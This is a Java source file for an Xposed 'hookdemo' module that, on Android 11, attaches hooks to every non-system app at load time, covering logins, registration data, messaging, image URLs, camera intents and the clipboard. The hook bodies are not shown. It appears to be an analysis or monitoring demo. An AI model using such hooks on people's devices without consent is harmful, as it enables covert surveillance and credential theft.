package com.kltn.hookdemo;

import android.app.ZygotePreload;
import android.content.pm.ApplicationInfo;
import android.os.Build;
import android.util.Log;


import com.kltn.hookdemo.hooking.ActivityContext;
import com.kltn.hookdemo.hooking.Clipboard;
import com.kltn.hookdemo.hooking.LoadImgURL;
import com.kltn.hookdemo.hooking.LoginActivity;
import com.kltn.hookdemo.hooking.RegisterInfo;
import com.kltn.hookdemo.hooking.SendMsg;
import com.kltn.hookdemo.hooking.CallIntent;

import java.util.ArrayList;

import de.robv.android.xposed.IXposedHookLoadPackage;
import de.robv.android.xposed.IXposedHookZygoteInit;
import de.robv.android.xposed.SELinuxHelper;
import de.robv.android.xposed.callbacks.XC_LoadPackage;
import de.robv.android.xposed.services.BaseService;


public class XModule implements IXposedHookLoadPackage {
    private static final String MONITOR_PACKAGENAME = "com.kltn.hookdemo";

    public void handleLoadPackage(final XC_LoadPackage.LoadPackageParam lpparam) throws Throwable {
        // Check API Version
        if (Build.VERSION.SDK_INT != 30) {
            return;
        }

        // Check hooking package
        if (lpparam.appInfo == null || (lpparam.appInfo.flags & (ApplicationInfo.FLAG_SYSTEM | ApplicationInfo.FLAG_UPDATED_SYSTEM_APP)) != 0) {
            return;
        } else if (lpparam.isFirstApplication && !MONITOR_PACKAGENAME.equals(lpparam.packageName)) {
            LoginActivity.starthook(lpparam);
            RegisterInfo.starthook(lpparam);
            SendMsg.starthook(lpparam);
            LoadImgURL.starthook(lpparam);
            CallIntent.starthookCam_Vid(lpparam);
            Clipboard.starthook(lpparam);
            ActivityContext.start(lpparam);
        }
    }



}
